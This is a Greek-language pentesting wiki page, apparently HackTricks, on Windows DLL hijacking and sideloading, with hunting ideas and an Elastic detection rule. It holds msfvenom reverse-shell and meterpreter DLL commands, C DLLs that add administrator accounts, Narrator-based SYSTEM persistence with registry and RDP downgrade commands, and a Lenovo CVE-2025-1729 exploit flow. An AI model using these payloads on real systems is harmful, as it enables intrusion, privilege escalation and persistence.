Έχει παρατηρηθεί στην πράξη ότι αυτή η τεχνική χρησιμοποιείται για τη δημιουργία αλυσίδων sideloading πολλών σταδίων: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια εκκινεί ένα binary υπογεγραμμένο από τη Microsoft και ευάλωτο σε hijacking, με προσαρμοσμένο DllPath, ώστε να εξαναγκάσει τη φόρτωση του DLL του επιτιθέμενου από έναν κατάλογο staging.<sup>[[6]](#references)</sup>


### Hijacking του .NET AppDomainManager μέσω του `.exe.config`

Για στόχους **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`**, χωρίς τροποποίηση της μνήμης, με κατάχρηση του παρακείμενου αρχείου **`.exe.config`** της εφαρμογής. Αντί να βασιστεί αποκλειστικά στη σειρά αναζήτησης DLL του Win32, ο επιτιθέμενος τοποθετεί ένα νόμιμο .NET EXE δίπλα σε ένα κακόβουλο config και ένα ή περισσότερα assemblies που ελέγχει.

Πώς λειτουργεί η αλυσίδα:<sup>[[15]](#references)[[22]](#references)</sup>
1. Εκκινείται το host EXE και το **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να δημιουργήσει ένα `AppDomainManager` που ελέγχει ο επιτιθέμενος.
3. Ο κακόβουλος manager αποκτά **εκτέλεση πριν από τη `Main()`** μέσα στην έμπιστη διεργασία του host.
4. Το ίδιο config μπορεί να αναγκάσει το CLR να επιλύει πρώτα τα τοπικά assemblies (για παράδειγμα, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και να αποδυναμώσει την επικύρωση/τηλεμετρία του runtime χωρίς inline patching.

Μοτίβο τύπου campaign (η ακριβής ένθεση μπορεί να διαφέρει ανάλογα με την οδηγία / έκδοση CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Γιατί είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση των assembly στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση στον κώδικα του επιτιθέμενου κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η νόμιμη λογική της εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή full-trust να φορτώσει assemblies χωρίς υπογραφή ή αλλοιωμένα assemblies, χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποτρέπει τις ανακατευθύνσεις publisher-policy σε νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** καθιστά την επιλογή runtime πιο ντετερμινιστική.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα μέσω ETW** από τη ρύθμιση παραμέτρων, αντί το implant να κάνει patch στο `EtwEventWrite` στη μνήμη.

Λειτουργικό μοτίβο που έχει παρατηρηθεί σε πρόσφατες εκστρατείες:
- Στάδιο 1: Αποθέτει τα `setup.exe`, `setup.exe.config` και τοπικά assemblies.
- Στάδιο 2: Τα αντιγράφει σε έναν εύλογο φάκελο **ενημέρωσης AppData**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω **scheduled task**.
- Στάδιο 3: Επαληθεύει το πλαίσιο εκτέλεσης (για παράδειγμα, ότι ο αναμενόμενος γονέας είναι το `svchost.exe` που εκκινήθηκε από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για hunting:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **εκτελέσιμα .NET** που εκτελούνται μαζί με ύποπτα αρχεία **`.config`** σε τοποθεσίες όπου οι χρήστες έχουν δικαίωμα εγγραφής.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
- Scheduled tasks που επανεκκινούν μετονομασμένα εκτελέσιμα ενημέρωσης από τους καταλόγους **`%LOCALAPPDATA%`** ή τους ειδικούς για την εφαρμογή καταλόγους `\bin\update\`.
- Αλυσίδες γονικών/θυγατρικών διεργασιών στις οποίες ένα scheduled task εκκινεί ένα έμπιστο .NET host που φορτώνει αμέσως assemblies τρίτων κατασκευαστών από τον δικό του κατάλογο.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL σύμφωνα με την τεκμηρίωση των Windows

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν συναντάται ένα **DLL με το ίδιο όνομα με ένα DLL που έχει ήδη φορτωθεί στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί γι' αυτό, ελέγχει για ανακατεύθυνση και manifest πριν επιλέξει ως προεπιλογή το DLL που βρίσκεται ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν αναζητά το DLL**.
- Αν το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα χρησιμοποιεί την έκδοση του known DLL, μαζί με τυχόν εξαρτώμενα DLL, **παραλείποντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει λίστα αυτών των known DLL.
- Αν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση των εξαρτώμενων DLL γίνεται σαν να προσδιορίζονταν μόνο με τα **ονόματα των modules** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που εκτελείται ή πρόκειται να εκτελεστεί με **διαφορετικά προνόμια** (οριζόντια ή lateral movement) και **λείπει ένα DLL**.
- Βεβαιωθείτε ότι υπάρχει **δικαίωμα εγγραφής** σε οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Αυτές οι προϋποθέσεις είναι ασυνήθιστες από προεπιλογή: τα εκτελέσιμα με αυξημένα προνόμια συνήθως δεν έχουν εξαρτήσεις από DLL που λείπουν, ενώ οι συνηθισμένοι χρήστες κανονικά δεν μπορούν να γράψουν σε καταλόγους του system search path. Ωστόσο, λανθασμένα ρυθμισμένα περιβάλλοντα μπορεί να εκθέσουν και τις δύο συνθήκες.\
Αν πληρούνται οι απαιτήσεις, ελέγξτε το έργο [UACME](https://github.com/hfiref0x/UACME). Παρότι ο κύριος στόχος του είναι η παράκαμψη UAC, περιέχει PoC για DLL hijacking σε συγκεκριμένες εκδόσεις των Windows, τα οποία συχνά μπορούν να προσαρμοστούν στον κατάλογο εγγραφής που εντοπίσατε.

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** ως εξής:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου αρχείου και τις εξαγωγές ενός DLL με:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Για έναν πλήρη οδηγό σχετικά με το πώς να **κάνετε abuse στο DLL Hijacking για κλιμάκωση προνομίων** έχοντας δικαιώματα εγγραφής σε έναν φάκελο **System Path**, δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε κάποιον φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για τον εντοπισμό αυτής της ευπάθειας είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Αν βρείτε ένα σενάριο που μπορεί να γίνει exploit, ένα από τα σημαντικότερα πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που θα εισαγάγει από αυτό το εκτελέσιμο**. Σε κάθε περίπτωση, σημειώστε ότι το DLL Hijacking είναι χρήσιμο για [**κλιμάκωση από επίπεδο Medium Integrity σε High (παρακάμπτοντας το UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity σε SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** σε αυτήν τη μελέτη για το DLL hijacking, η οποία εστιάζει στο DLL hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε ορισμένα **βασικά παραδείγματα κώδικα dll** που μπορεί να χρησιμεύσουν ως **πρότυπα** ή για τη δημιουργία ενός **dll με εξαγόμενες συναρτήσεις που δεν απαιτούνται**.

## **Δημιουργία και μεταγλώττιση DLLs**

### **DLL Proxifying**

Βασικά, ένα **DLL proxy** είναι ένα DLL που μπορεί να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά και να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, **προωθώντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να κάνετε proxify και να **δημιουργήσετε ένα proxified dll**, ή να **ορίσετε το DLL** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Αποκτήστε ένα meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Δημιουργήστε έναν χρήστη (x86, δεν βρήκα έκδοση x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Το δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε συνάρτηση που εισάγει η διεργασία-θύμα**. Αν λείπει κάποια απαιτούμενη εξαγωγή, το binary δεν μπορεί να την επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Εναλλακτική C DLL με σημείο εισόδου νήματος</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT με αρχικοποίηση που ενεργοποιείται από export

Μια **αυτοτελής .NET NativeAOT shared library** μπορεί να χρησιμοποιηθεί ως planted native DLL χωρίς να υλοποιηθεί ρητά `DllMain`. Κάντε export στατικές μεθόδους C# με `[UnmanagedCallersOnly(EntryPoint = "...")]`· όταν ο native host καλέσει ένα από αυτά τα entry points που δημιουργούνται από τον compiler, το NativeAOT αρχικοποιεί το module και εκτελείται μια μέθοδος `[ModuleInitializer]` πριν από το exported σώμα C#. Το output δεν απαιτεί ξεχωριστά εγκατεστημένο .NET runtime.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Η DLL εξακολουθεί να χρειάζεται τα **ονόματα export και τις υπογραφές που είναι συμβατές με το ABI** και τις οποίες καλεί πράγματι ο επιλεγμένος host. Ελάχιστα stubs μπορεί να αρκούν για να ενεργοποιήσουν την αρχικοποίηση, αλλά τα exports που λείπουν μπορεί να εμποδίσουν τη φόρτωση, ενώ μια λανθασμένη υπογραφή μπορεί να καταστρέψει την κλήση. Καταγράψτε τα imports του host και επικυρώστε το αποτέλεσμα με `dumpbin /exports payload.dll` πριν μετονομάσετε το output στο όνομα dependency που αναμένει ο host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Ελάχιστη exported DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Διαμορφώστε το project ως αυτοτελή εγγενή κοινόχρηστη βιβλιοθήκη Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Τοποθετήστε το μετονομασμένο DLL δίπλα στο αντιγραμμένο ευάλωτο εκτελέσιμο και εκκινήστε το host μέσω της διαδρομής κώδικα που καλεί το συμβατό export. Αυτή η προσέγγιση με initializer αποφεύγει την τοποθέτηση σύνθετης εργασίας απευθείας στο `DllMain`, αλλά οι προϋποθέσεις του sideload παραμένουν αμετάβλητες: ο loader πρέπει να επιλύσει την εξάρτηση με βάση το όνομα, να επιλέξει τον κατάλογο της εφαρμογής και να μην την εντοπίσει πρώτα μέσω των KnownDLLs, μιας ήδη φορτωμένης λειτουργικής μονάδας, ανακατεύθυνσης SxS ή περιοριστικών σημαιών `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Για συμβατικά native templates, δείτε τα [Windows C payloads](../windows-c-payloads.md). Ένα sideloaded πρώτο στάδιο μπορεί στη συνέχεια να εκτελέσει [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), αλλά αυτό είναι ξεχωριστή τεχνική injection και όχι μέρος της επίλυσης DLL.

## Ανίχνευση: φορτώσεις βιβλιοθηκών με πλαστοπροσωπία DLL

Το Elastic Defend 9.5.0 εμπλουτίζει ένα συμβάν φόρτωσης βιβλιοθήκης με `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` όταν το φορτωμένο αρχείο δεν είναι υπογεγραμμένο από τη Microsoft και το όνομά του συμπίπτει με όνομα DLL των Windows/συστήματος από το αποθηκευμένο στην cache απόθεμα της Elastic. Έτσι, η απογραφή ονομάτων αρχείων και η ανάλυση τοποθεσίας συστήματος και υπογραφής μεταφέρονται στον αισθητήρα endpoint· επομένως, ο βασικός κανόνας EQL μπορεί να περιοριστεί σε:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Αντιμετωπίστε τον εμπλουτισμό ως σημαντικό pivot και όχι ως απόδειξη από μόνο του. Αυξήστε την εμπιστοσύνη όταν ένας υπογεγραμμένος host φορτώνει το DLL από δικό του **εγγράψιμο από τον χρήστη** κατάλογο, το DLL είναι ανυπόγραφο/μη έμπιστο και το `dll.Ext.relative_file_creation_time` δείχνει ότι δημιουργήθηκε λίγο πριν από τη φόρτωσή του. Περιορίστε τις εξαιρέσεις στον ακριβή publisher + host process + installation path· μην παραλείπετε καθολικά ένα όνομα DLL που συγκρούεται, επειδή νόμιμα installers και εφαρμογές μπορεί να διαθέτουν ιδιωτικές βιβλιοθήκες με ονόματα παρόμοια με ονόματα συστήματος.<sup>[[26]](#references)</sup>

Σε αισθητήρες χωρίς αυτόν τον εμπλουτισμό, προσεγγίστε τη συμπεριφορά συσχετίζοντας ένα όνομα DLL που συγκρούεται με μια διαδρομή φόρτωσης εκτός συστήματος, ανύπαρκτη/μη έμπιστη υπογραφή Microsoft και μικρό διάστημα από τη δημιουργία του αρχείου έως τη φόρτωσή του. Αυτό απαιτεί διατηρούμενο κατάλογο ονομάτων DLL και στενά ορισμένες εξαιρέσεις για τα `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` και άλλες εγκεκριμένες διαδρομές ανάπτυξης.<sup>[[26]](#references)</sup>

## Μελέτη περίπτωσης: DLL Hijack της Narrator OneCore TTS Localization (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά ένα προβλέψιμο, ειδικό για τη γλώσσα DLL localization, το οποίο μπορεί να γίνει hijack για αυθαίρετη εκτέλεση κώδικα και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Διαδρομή αναζήτησης (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλαιότερη διαδρομή (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει εγγράψιμο DLL που ελέγχεται από attacker στη διαδρομή OneCore, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Εντοπισμός με Procmon
- Φίλτρο: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης από την παραπάνω διαδρομή.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Σιωπηλή λειτουργία OPSEC
- Ένα αφελές hijack θα κάνει το UI να εμφανιστεί/επισημανθεί. Για να παραμείνετε διακριτικοί, κατά την προσάρτηση απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και αναστείλετέ το με `SuspendThread`. Συνεχίστε στο δικό σας νήμα. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Ενεργοποίηση και persistence μέσω ρυθμίσεων Accessibility
- Πλαίσιο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, όταν ξεκινήσει το Narrator, φορτώνεται το τοποθετημένο DLL. Στην ασφαλή επιφάνεια εργασίας (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει το Narrator· το DLL σας εκτελείται ως SYSTEM στην ασφαλή επιφάνεια εργασίας.

Εκτέλεση SYSTEM μέσω RDP (lateral movement)
- Επιτρέψτε το κλασικό επίπεδο ασφάλειας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε στον υπολογιστή μέσω RDP και, στην οθόνη σύνδεσης, πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στην ασφαλή επιφάνεια εργασίας.
- Η εκτέλεση σταματά όταν κλείσει η συνεδρία RDP—κάντε inject/migrate χωρίς καθυστέρηση.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη καταχώριση μητρώου Accessibility Tool (AT) (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγετε και, στη συνέχεια, να ορίσετε το `configuration` στο όνομα αυτού του AT. Έτσι, η εκτέλεση αυθαίρετου κώδικα γίνεται μέσω του framework Accessibility.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation με χρήση του TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), το οποίο παρακολουθείται ως **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Λεπτομέρειες ευπάθειας

- **Στοιχείο**: Το `TPQMAssistant.exe`, που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη εργασία**: Η `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. στο πλαίσιο του λογαριασμού του συνδεδεμένου χρήστη.
- **Δικαιώματα καταλόγου**: Εγγράψιμος από το `CREATOR OWNER`, επιτρέποντας στους τοπικούς χρήστες να τοποθετούν αυθαίρετα αρχεία.
- **Συμπεριφορά αναζήτησης DLL**: Επιχειρεί πρώτα να φορτώσει το `hostfxr.dll` από τον τρέχοντα κατάλογο εργασίας και καταγράφει «NAME NOT FOUND» αν λείπει, υποδεικνύοντας ότι η αναζήτηση στον τοπικό κατάλογο έχει προτεραιότητα.

### Υλοποίηση exploit

Ένας attacker μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος την απουσία του DLL για να πετύχει εκτέλεση κώδικα στο πλαίσιο του χρήστη:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Ροή επίθεσης

1. Ως απλός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Αν κατά την εκτέλεση της εργασίας είναι συνδεδεμένος ένας διαχειριστής, το κακόβουλο DLL εκτελείται στη συνεδρία του διαχειριστή με μέσο επίπεδο ακεραιότητας.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης UAC για να αποκτήσετε προνόμια SYSTEM από το μέσο επίπεδο ακεραιότητας.

## Μελέτη περίπτωσης: Dropper μέσω MSI CustomAction + DLL Side-Loading μέσω υπογεγραμμένου host (wsc_proxy.exe)

Οι φορείς απειλών συχνά συνδυάζουν droppers μέσω MSI με DLL side-loading, ώστε να εκτελούν payloads μέσω μιας έμπιστης, υπογεγραμμένης διεργασίας.<sup>[[10]](#references)</sup>

Επισκόπηση της αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Μια CustomAction εκτελείται σιωπηλά κατά την εγκατάσταση μέσω GUI (π.χ. LaunchApplication ή μια ενέργεια VBScript), ανακατασκευάζοντας το επόμενο στάδιο από ενσωματωμένους πόρους.
- Το dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: το υπογεγραμμένο από την Avast wsc_proxy.exe + το wsc.dll που ελέγχεται από τον εισβολέα).
- Κατά την εκκίνηση του υπογεγραμμένου EXE, η σειρά αναζήτησης DLL των Windows φορτώνει πρώτα το wsc.dll από τον κατάλογο εργασίας, εκτελώντας κώδικα του εισβολέα με υπογεγραμμένη γονική διεργασία (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- Πίνακας CustomAction:
  - Αναζητήστε εγγραφές που εκτελούν εκτελέσιμα αρχεία ή VBScript. Παράδειγμα ύποπτου μοτίβου: το LaunchApplication εκτελεί ένα ενσωματωμένο αρχείο στο παρασκήνιο.
  - Στο Orca (Microsoft Orca.exe), εξετάστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διαχωρισμένα payloads στο CAB του MSI:
  - Εξαγωγή για διαχειριστές: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
  - Αναζητήστε πολλά μικρά τμήματα που συνενώνονται και αποκρυπτογραφούνται από μια CustomAction VBScript. Συνήθης ροή:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
  - wsc_proxy.exe: νόμιμο, υπογεγραμμένο host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με βάση το όνομά του από τον φάκελό της.
  - wsc.dll: DLL του επιτιθέμενου. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στην αυθεντική βιβλιοθήκη, εκτελώντας ταυτόχρονα το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Για απαιτήσεις εξαγωγών, χρησιμοποιήστε ένα framework proxying (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί απόλυτες διαδρομές ή flags ασφαλούς φόρτωσης (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
